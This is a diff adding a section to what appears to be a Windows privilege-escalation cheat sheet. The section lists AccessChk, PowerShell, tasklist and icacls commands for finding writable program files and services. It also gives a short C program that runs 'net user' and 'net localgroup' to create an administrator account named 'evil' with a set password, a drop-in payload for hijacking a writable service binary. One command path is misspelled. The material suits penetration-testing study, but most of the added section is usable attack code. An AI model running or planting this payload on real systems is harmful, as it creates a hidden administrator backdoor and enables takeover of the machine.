@@ -128,6 +128,30 @@ Windows Privilege Escalation Methodology
   
 
 ## Insecure File/Folder Permissions
+* use: https://download.sysinternals.com/files/AccessChk.zip
+* Search for world writable files and directories:
+  * accesschk.exe -uws "Everyone" "C:\Progrma Files"
+  * powershell: Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+  
+* Or find running proccess:
+  * tasklist /SVC > tasks.txt
+  * powershell:  Get-WmiObject win32_service | Select-Object Name, State, PathName| Where-Object {$_.State -like 'Running'}
+  
+-> Focus on Program Files or compare with a Defaults of your system.
+
+* icacls "<path>\<file>.exe"
+'''
+#include <stdlib.h>
+int main ()
+{
+ int i;
+
+ i = system ("net user evil Ev!lpass /add");
+ i = system ("net localgroup administrators evil /add");
+return 0;
+}
+'''
+
 ## Token Manipulation
 * whoami /priv
 * More info here: https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf
